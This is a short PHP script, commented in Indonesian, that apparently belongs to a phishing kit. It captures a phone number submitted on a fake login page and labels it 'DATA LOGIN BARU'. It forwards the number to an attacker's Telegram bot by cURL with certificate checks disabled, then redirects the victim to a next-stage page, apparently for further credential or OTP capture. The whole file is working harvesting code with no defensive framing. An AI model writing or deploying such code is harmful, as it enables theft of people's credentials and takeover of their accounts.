<?php
// Memanggil file konfigurasi bot (Token & Chat ID)
include "../telegram.php"; 
session_start();

// Validasi metode pengiriman data
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['nohp'])) {
    
    // Ambil data nomor HP
    $nohp = htmlspecialchars($_POST['nohp']);
    
    // Simpan ke session
    $_SESSION['nohp'] = $nohp;

    // Format pesan Telegram yang lebih simpel
    $message = "🔔 *DATA LOGIN BARU*\n";
    $message .= "──────────────────\n";
    $message .= "📱 *Nomor HP:* `" . $nohp . "`\n";
    $message .= "⏰ *Waktu:* " . date('d-m-Y H:i:s') . "\n";
    $message .= "──────────────────";

    // Fungsi kirim Telegram menggunakan cURL
    function sendMessage($id_telegram, $message, $id_botTele) {
        $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage";
        $data = [
            'chat_id' => $id_telegram,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    // Jalankan fungsi pengiriman
    sendMessage($id_telegram, $message, $id_botTele);

    // Alihkan ke halaman berikutnya
    header('Location: ../sec.php');
    exit();

} else {
    // Jika akses ilegal, kembalikan ke awal
    header('Location: ../index.php');
    exit();
}
?>
